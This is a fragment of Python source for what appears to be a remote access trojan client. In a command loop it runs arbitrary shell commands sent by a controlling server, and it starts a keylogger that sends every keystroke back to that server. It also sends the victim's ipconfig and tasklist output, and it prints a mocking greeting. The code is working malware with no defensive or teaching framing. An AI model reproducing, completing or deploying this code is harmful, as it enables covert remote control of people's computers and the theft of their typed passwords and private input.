    ...
    try:
        ...
        while True:
            ...
            if server_command == "cmd off":
                cmd_mode = False
                client.send("Terminal access closed.".encode('utf-8'))
                continue

            if cmd_mode:
                os.popen(server_command)

            elif server_command == "keylogger":

                def on_press(key):
                    client.send("{0}  ".format(key).encode('utf-8'))

                def on_release(key):
                    if key == keyboard.Key.esc:
                        client.send("<Esc> key pressed. Keylogger closed.".encode('utf-8'))
                        return False

                with Listener(on_press=on_press, on_release=on_release) as listener:
                    listener.join()

            elif server_command == "ip":
                data = subprocess.check_output(['ipconfig']).decode('utf-8')
                client.send(data.encode('utf-8'))

            elif server_command == "tasklist":
                data = subprocess.check_output(['tasklist']).decode('utf-8')
                client.send(data.encode('utf-8'))

            elif server_command == "greet":
                print("Hello! I hope you are having fun. Because I am having fun.")
